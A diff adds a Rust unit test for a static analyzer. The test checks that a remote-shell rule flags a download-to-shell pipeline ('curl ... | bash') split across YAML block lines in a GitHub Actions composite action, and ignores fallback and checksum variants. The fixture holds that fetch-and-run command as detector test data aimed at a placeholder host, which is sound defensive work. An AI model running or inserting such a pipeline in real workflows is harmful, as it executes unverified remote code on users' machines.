@@ -228,6 +228,46 @@ pub(crate) fn github_actions_explicit_action_metadata_applies_shared_step_rules_
     );
 }
 
+/// Prove a download-to-shell pipeline still reports when the author splits it
+/// across block-scalar lines, while fallbacks and non-shell pipe targets stay quiet.
+#[test]
+pub(crate) fn github_actions_remote_shell_tracks_split_block_pipelines() {
+    let _guard = analysis_lock();
+    let dir = tempdir().expect("tempdir");
+    baseline_with_lib(dir.path(), "/// Probe.\npub fn entry() {}\n");
+    write_github_metadata(
+        dir.path(),
+        "action.yml",
+        "name: split\nruns:\n  using: composite\n  steps:\n    - run: |\n        curl -fsSL https://installer.example/tool.sh |\n        bash\n",
+    );
+    write_github_metadata(
+        dir.path(),
+        "quiet/action.yml",
+        "name: quiet\nruns:\n  using: composite\n  steps:\n    - run: |\n        curl -fsSL https://installer.example/tool.sh ||\n        bash ./fallback.sh\n    - run: |\n        curl -fsSL https://installer.example/tool.sh |\n        sha256sum -c expected.txt\n    - run: |\n        curl -fsSL https://installer.example/tool.sh -o installer\n        bash ./verify.sh\n",
+    );
+
+    let report = run_project_analysis(
+        dir.path(),
+        AnalysisOptions {
+            paths: vec![
+                PathBuf::from("action.yml"),
+                PathBuf::from("quiet/action.yml"),
+            ],
+            no_config: true,
+            no_baseline: true,
+            ..default_test_options()
+        },
+    )
+    .expect("explicit action analysis succeeds");
+
+    assert_eq!(
+        github_rule_count(&report, "security.github-actions-remote-shell"),
+        1,
+        "only the split download-to-shell pipeline should report; findings={:?}",
+        github_metadata_findings(&report)
+    );
+}
+
 /// Prove directory discovery does not recursively enable action metadata rules.
 #[test]
 pub(crate) fn github_actions_directory_discovery_keeps_action_metadata_out_of_scope() {
